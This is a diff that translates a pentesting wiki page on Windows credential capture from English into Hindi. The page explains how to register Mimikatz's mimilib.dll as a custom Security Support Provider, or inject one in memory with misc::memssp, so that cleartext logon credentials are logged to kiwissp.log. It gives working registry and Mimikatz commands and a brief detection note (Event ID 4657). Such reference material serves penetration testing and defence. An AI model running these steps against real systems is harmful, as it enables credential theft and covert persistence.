@@ -4,44 +4,37 @@
 
 ### Custom SSP
 
-[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
-You can create you **own SSP** to **capture** in **clear text** the **credentials** used to access the machine.
+[यहाँ जानें कि SSP (सिक्योरिटी सपोर्ट प्रोवाइडर) क्या है।](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
+आप **अपना खुद का SSP** बना सकते हैं ताकि मशीन तक पहुँचने के लिए उपयोग किए गए **क्रेडेंशियल्स** को **स्पष्ट पाठ** में **कैप्चर** किया जा सके।
 
 #### Mimilib
 
-You can use the `mimilib.dll` binary provided by Mimikatz. **This will log inside a file all the credentials in clear text.**\
-Drop the dll in `C:\Windows\System32\`\
-Get a list existing LSA Security Packages:
-
+आप Mimikatz द्वारा प्रदान किए गए `mimilib.dll` बाइनरी का उपयोग कर सकते हैं। **यह सभी क्रेडेंशियल्स को स्पष्ट पाठ में एक फ़ाइल के अंदर लॉग करेगा।**\
+dll को `C:\Windows\System32\` में डालें\
+मौजूदा LSA सुरक्षा पैकेजों की सूची प्राप्त करें:
 ```bash:attacker@target
 PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
 
 HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
-    Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
+Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
-
-Add `mimilib.dll` to the Security Support Provider list (Security Packages):
-
+`mimilib.dll` को सुरक्षा समर्थन प्रदाता सूची (सुरक्षा पैकेज) में जोड़ें:
 ```powershell
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
+और एक रिबूट के बाद सभी क्रेडेंशियल्स `C:\Windows\System32\kiwissp.log` में स्पष्ट पाठ में पाए जा सकते हैं।
 
-And after a reboot all credentials can be found in clear text in `C:\Windows\System32\kiwissp.log`
+#### मेमोरी में
 
-#### In memory
-
-You can also inject this in memory directly using Mimikatz (notice that it could be a little bit unstable/not working):
-
+आप इसे सीधे मेमोरी में Mimikatz का उपयोग करके भी इंजेक्ट कर सकते हैं (ध्यान दें कि यह थोड़ा अस्थिर/काम नहीं कर सकता):
 ```powershell
 privilege::debug
 misc::memssp
 ```
+यह रिबूट को सहन नहीं करेगा।
 
-This won't survive reboots.
+#### शमन
 
-#### Mitigation
-
-Event ID 4657 - Audit creation/change of `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
+इवेंट आईडी 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` का ऑडिट निर्माण/परिवर्तन
 
 {{#include ../../banners/hacktricks-training.md}}
-
